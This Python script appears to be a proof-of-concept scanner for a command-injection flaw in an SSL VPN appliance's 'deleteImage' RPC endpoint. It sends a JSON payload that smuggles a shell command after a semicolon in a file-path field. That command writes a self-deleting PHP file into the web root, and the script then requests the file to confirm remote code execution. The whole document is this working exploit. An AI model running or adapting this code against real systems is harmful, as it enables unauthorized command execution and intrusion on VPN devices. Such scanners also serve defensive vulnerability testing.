import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r2=randomLowercase(10)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"directdata/direct/router"
	body='{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo \'<?php echo md5('+r2+');unlink(__FILE__);?>\' >/var/www/html/'+r2+'.php"]}],"type":"rpc","tid":17}'
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "SSLVPN_Resource" in response.text and "\"result\":{\"success\":true}" in response.text:
		r0=True
	else:
		r0=False
	url=baseurl+""+r2+".php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(r2).encode()).hexdigest() in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
